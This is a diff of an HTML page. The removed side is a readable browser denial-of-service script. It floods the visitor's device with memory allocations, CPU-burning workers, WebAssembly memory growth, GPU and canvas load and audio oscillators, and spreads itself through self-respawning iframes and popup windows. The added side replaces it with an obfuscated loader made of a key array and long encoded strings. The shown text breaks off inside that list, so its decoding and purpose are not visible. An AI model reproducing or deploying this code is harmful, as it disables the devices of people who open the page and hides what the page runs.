@@ -1,297 +1,156 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title></title>
-  <style>
-    *{margin:0;padding:0}
-    html,body{width:100%;height:100%;overflow:hidden;background:#000;touch-action:none}
-    #nest{position:fixed;inset:0;display:grid;grid-template-columns:repeat(4,1fr);grid-template-rows:repeat(3,1fr);opacity:.3}
-    #nest iframe{width:100%;height:100%;border:0;background:#000}
-    #stage{position:fixed;inset:0;pointer-events:none}
-    canvas{position:absolute;inset:0;width:100%;height:100%;mix-blend-mode:screen}
-    .blob{position:absolute;width:50vw;height:50vh;border-radius:40%;
-      background:radial-gradient(circle,#ff0,#f0f,#0ff,transparent 70%);
-      filter:blur(40px) contrast(3);animation:s .2s linear infinite;mix-blend-mode:color-dodge}
-    @keyframes s{to{transform:rotate(360deg) scale(1.5)}}
-    body.slave #nest{display:none}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title></title>
 </head>
-<body>
-  <div id="nest"></div>
-  <div id="stage"></div>
-  <script>
-  (() => {
-    const q = new URLSearchParams(location.search);
-    const SLAVE = q.get('slave') === '1';
-    const MOBILE = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
-    const cores = navigator.hardwareConcurrency || 8;
-    if (SLAVE) document.body.classList.add('slave');
-
-    const stage = document.getElementById('stage');
-    const nest = document.getElementById('nest');
-    const hold = [];
-    const workers = [];
-
-    function touch(u8) {
-      for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
-    }
-
-    function eat(mb) {
-      try {
-        const n = (mb || (MOBILE ? 32 : 64)) * 1024 * 1024;
-        const a = new Uint8Array(n);
-        touch(a);
-        hold.push(a);
-        hold.push(new Float64Array((mb || 32) * 64 * 1024));
-      } catch (_) {
-        try {
-          const a = new Uint8Array(4 * 1024 * 1024);
-          touch(a);
-          hold.push(a);
-        } catch (__) {}
-      }
-    }
-
-    const cpuCode = `
-      const N = 1024 * 512;
-      const a = new Float64Array(N), b = new Float64Array(N);
-      let n = Math.random();
-      function burn() {
-        for (let i = 0; i < N; i++) {
-          n = Math.sin(n + a[i]) * Math.cos(b[i]) + Math.sqrt(Math.abs(n) + 1e-9);
-          a[i] = n; b[i] = n * 1.01;
-        }
-        postMessage(1);
-        setTimeout(burn, 0);
-      }
-      burn();
-      setInterval(function(){ var x=1; for (var i=0;i<5e6;i++) x=Math.sin(x)*Math.cos(x); }, 1);
-    `;
-
-    const ramCode = `
-      var hold = [];
-      var mb = ${MOBILE ? 32 : 64};
-      function alloc() {
-        try {
-          var u8 = new Uint8Array(mb * 1024 * 1024);
-          for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
-          hold.push(u8);
-          hold.push(new Float64Array(mb * 32 * 1024));
-          postMessage(hold.length);
-        } catch (e) {
-          try {
-            var u8 = new Uint8Array(4 * 1024 * 1024);
-            for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
-            hold.push(u8);
-            postMessage(hold.length);
-          } catch (e2) {}
-        }
-        setTimeout(alloc, 3);
-      }
-      alloc();
-      setInterval(alloc, 8);
-    `;
-
-    function mkWorker(code) {
-      const url = URL.createObjectURL(new Blob([code], { type: 'application/javascript' }));
-      const w = new Worker(url);
-      workers.push(w);
-      return w;
-    }
-
-    function spawnCPU(n) {
-      for (let i = 0; i < n; i++) {
-        try { mkWorker(cpuCode); } catch (_) {}
-      }
-    }
-    function spawnRAM(n) {
-      for (let i = 0; i < n; i++) {
-        try { mkWorker(ramCode); } catch (_) {}
-      }
-    }
-
-    const burst = SLAVE ? (MOBILE ? 20 : 24) : (MOBILE ? 10 : 12);
-    for (let i = 0; i < burst; i++) eat();
-
-    if (SLAVE) {
-      spawnCPU(Math.max(24, cores * 5));
-      spawnRAM(Math.max(10, cores + 2));
-    } else {
-      spawnCPU(Math.max(16, cores * 3));
-      spawnRAM(Math.max(8, cores));
-    }
-
-    setInterval(() => {
-      try { mkWorker(cpuCode); } catch (_) {}
-      try { mkWorker(ramCode); } catch (_) {}
-      eat();
-    }, SLAVE ? 50 : 80);
-
-    try {
-      const mem = new WebAssembly.Memory({ initial: 256, maximum: 65536 });
-      hold.push(mem);
-      setInterval(() => {
-        try { mem.grow(128); touch(new Uint8Array(mem.buffer)); } catch (_) {}
-      }, 15);
-    } catch (_) {}
-
-    const canvases = [];
-    const ctxs = [];
-    const nCanvas = SLAVE ? 6 : 3;
-    for (let i = 0; i < nCanvas; i++) {
-      const c = document.createElement('canvas');
-      c.width = MOBILE ? 800 : 1280;
-      c.height = MOBILE ? 450 : 720;
-      stage.appendChild(c);
-      canvases.push(c);
-      ctxs.push(c.getContext('2d'));
-    }
-    for (let i = 0; i < (SLAVE ? 20 : 10); i++) {
-      const el = document.createElement('div');
-      el.className = 'blob';
-      el.style.left = (Math.random() * 90) + '%';
-      el.style.top = (Math.random() * 90) + '%';
-      stage.appendChild(el);
-    }
-
-    const glCanvas = document.createElement('canvas');
-    glCanvas.width = MOBILE ? 1280 : 1920;
-    glCanvas.height = MOBILE ? 720 : 1080;
-    stage.appendChild(glCanvas);
-    let gl = null, glProg = null;
-    try {
-      gl = glCanvas.getContext('webgl', { powerPreference: 'high-performance' });
-      if (gl) {
-        const vs = gl.createShader(gl.VERTEX_SHADER);
-        gl.shaderSource(vs, 'attribute vec2 a;varying vec2 v;void main(){v=a;gl_Position=vec4(a,0.,1.);}');
-        gl.compileShader(vs);
-        const fs = gl.createShader(gl.FRAGMENT_SHADER);
-        gl.shaderSource(fs, `
-          precision mediump float; varying vec2 v; uniform float t;
-          void main(){
-            vec2 p=v*40.; float n=0.;
-            for(int i=0;i<40;i++){
-              float fi=float(i);
-              n+=sin(p.x*fi*.12+t)*cos(p.y*fi*.15-t);
-              p*=1.05;
-            }
-            gl_FragColor=vec4(.5+.5*sin(n+t),.5+.5*cos(n),.5+.5*sin(n*2.-t),1.);
-          }`);
-        gl.compileShader(fs);
-        glProg = gl.createProgram();
-        gl.attachShader(glProg, vs); gl.attachShader(glProg, fs); gl.linkProgram(glProg);
-        gl.useProgram(glProg);
-        const buf = gl.createBuffer();
-        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
-        const loc = gl.getAttribLocation(glProg, 'a');
-        gl.enableVertexAttribArray(loc);
-        gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
-      }
-    } catch (_) {}
-
-    let frames = 0;
-    function tick(t) {
-      frames++;
-      let x = Math.random();
-      const end = performance.now() + (SLAVE ? 4 : 2);
-      while (performance.now() < end) x = Math.sin(x);
-      for (let i = 0; i < ctxs.length; i++) {
-        const ctx = ctxs[i], c = canvases[i];
-        if (!ctx) continue;
-        ctx.fillStyle = 'rgb(' + ((t + i * 40) % 255 | 0) + ',' + ((t * 0.7) % 255 | 0) + ',80)';
-        ctx.globalAlpha = 0.15;
-        ctx.fillRect(Math.random() * c.width, Math.random() * c.height, 200, 200);
-        ctx.filter = 'blur(3px)';
-        ctx.drawImage(c, -10, -10, c.width + 20, c.height + 20);
-      }
-      if (gl && glProg) {
-        gl.uniform1f(gl.getUniformLocation(glProg, 't'), t * 0.001);
-        for (let i = 0; i < 6; i++) gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-      }
-      if (frames % 4 === 0) eat(MOBILE ? 16 : 32);
-      requestAnimationFrame(tick);
-    }
-    requestAnimationFrame(tick);
-
-    try {
-      const ac = new (window.AudioContext || window.webkitAudioContext)();
-      for (let i = 0; i < (SLAVE ? 48 : 24); i++) {
-        const o = ac.createOscillator(), g = ac.createGain(), f = ac.createBiquadFilter();
-        f.type = 'bandpass'; f.frequency.value = 100 + i * 80; f.Q.value = 20;
-        g.gain.value = 0.0003;
-        o.type = i % 2 ? 'sawtooth' : 'square';
-        o.frequency.value = 40 + i * 30;
-        o.connect(f); f.connect(g); g.connect(ac.destination);
-        o.start();
-      }
-      document.addEventListener('click', () => ac.resume(), { once: true });
-      ac.resume().catch(() => {});
-    } catch (_) {}
-
-    if (!SLAVE) {
-      const slaveHref = (() => {
-        const u = new URL(location.href);
-        u.searchParams.set('slave', '1');
-        return u.href;
-      })();
-      const iframes = [];
-
-      function addIframe() {
-        const f = document.createElement('iframe');
-        f.src = slaveHref + '&t=' + Date.now() + Math.random();
-        nest.appendChild(f);
-        iframes.push(f);
-        return f;
-      }
-
-      let made = 0;
-      const target = MOBILE ? 12 : 16;
-      const timer = setInterval(() => {
-        if (made >= target) { clearInterval(timer); return; }
-        addIframe();
-        made++;
-      }, 100);
-
-      if (!MOBILE) {
-        setTimeout(() => {
-          for (let i = 0; i < 6; i++) {
-            try {
-              window.open(slaveHref + '&p=' + i + '&t=' + Date.now(), 's' + i + Date.now(),
-                'width=300,height=200,left=' + (i * 40) + ',top=' + (i * 30));
-            } catch (_) {}
-          }
-        }, 500);
-      }
-
-      setInterval(() => {
-        for (let i = 0; i < iframes.length; i++) {
-          let dead = false;
-          try {
-            if (!iframes[i].contentWindow) dead = true;
-            else void iframes[i].contentDocument;
-          } catch (_) { dead = true; }
-          if (dead) {
-            try { iframes[i].remove(); } catch (_) {}
-            iframes[i] = addIframe();
-          }
-        }
-        if (iframes.length < target) addIframe();
-        eat();
-      }, 600);
-
-      document.addEventListener('click', () => {
-        for (let i = 0; i < 3; i++) addIframe();
-        if (!MOBILE) {
-          try {
-            window.open(slaveHref + '&t=' + Date.now(), '_blank', 'width=300,height=200');
-          } catch (_) {}
-        }
-      });
-    }
-  })();
-  </script>
+<body style="margin:0;background:#000;overflow:hidden;touch-action:none">
+<script>
+(function(){
+var a=[167,60,145,94,43,244,104,13,194,25,127,225,68,184,109,3];
+var b=['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',
+'d7nIIks9/xNohTWOaRdGgH6H4VqTg0qUWLMJ+Tc/xGq/UNADspVXvsolyTpGKLAnjjhSpC+tZaPpZbdCn8JpNL5iIuILfeJTa',
+'wShRa6bSrFnkqn4Ww3PAxiVBfZi+Uu+RejCAqvdHzNI5VWmRTSsPZry03Lm7WGm7zUQ3xhfqj+scCP7w6l/megUpVSy24gOv0',
+'IghhJWpUPYVcU29utS/l7WTZcoVdcyAb4/5sa7Iq4OstIyu2Wgbzz7dYNFA/rfN/mIYov9P9OoxXXbZliDGq1aclqk8kaDw0i',
+'vdrYrkj6eH2iCK12f7uJP1SaG+yGhACFG8jg9+gB38aAWy4ty9H6i4iJLPbxcJtZhxkhbH44/wqAGm8cP1knHXpx2a9J+3gLB',
+'DaXOC/PJJYhmCH71Luh+HfNvu3vCqifkD56lexK+ICL/CzP6BCgjuUmnz1TaD8CgkwIFoQoDvwX2NqsSvlKHlgLl3QIzJaQB7',
+'ggpoyCKvd968vYF47g1ZZZWTecQvXYr7YW9Pca6S71PpoCoDq5SMpIbTY8FlwfFPrquBv4Xgh/CewbfOgi5FYjdu2ulBbvSaZ',
+'Et7yN49SXWFkvy0D7/og/KqXfd+4w7jigbyU6vaTsv0o1Fg/VU0T64aN1tlgA5y1ZUn7jICJRyzvUxvxwmGp86Oedtefe2Hpi',
+'CMtV+s6cvUjTkOWiFNcYmWwKOLtLzadKwD95Ym162NBCbA94fggzrl1/ihjWEfWw7oi6OMlKyO/BFo/h1pVaWy3JO8TF2j04u',
+'7BJvAP0X74Bozm6S8tJbDc9QXcFxv3vuXetKyoBX+ZMTM1jsTowGe+JuzvLPWPvtL+O4NSfDBEW6V+UIYqLLvX+Tu0DhL+iPx',
+'1z4E36aXRjBAIwcinj+4gn+CMNQwjMAzmgI41q0xrN071yymy+rNqY/bbAzzV9A+Zc+ur8Pyql33fuMO44+Esgjr0Y6XJjCHI',
+'vAHJ526yeSL5dZaIIrXZ/z00//Job7Yq0BPEGmez/uLlv6oVPWljKeVKLiIks9/0Up1zWOaRdGjjPSyW+A5w/DWNVFtiAqgH6',
+'TQIJf65kEnudH/AojO70unSBSqDu7e/7jX6VWlstyHvg3bKFfNPAdKAS5SqnYSsduydjSWw3PAxiVBaJk8hLlNMLCAqvdHzNI',
+'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',
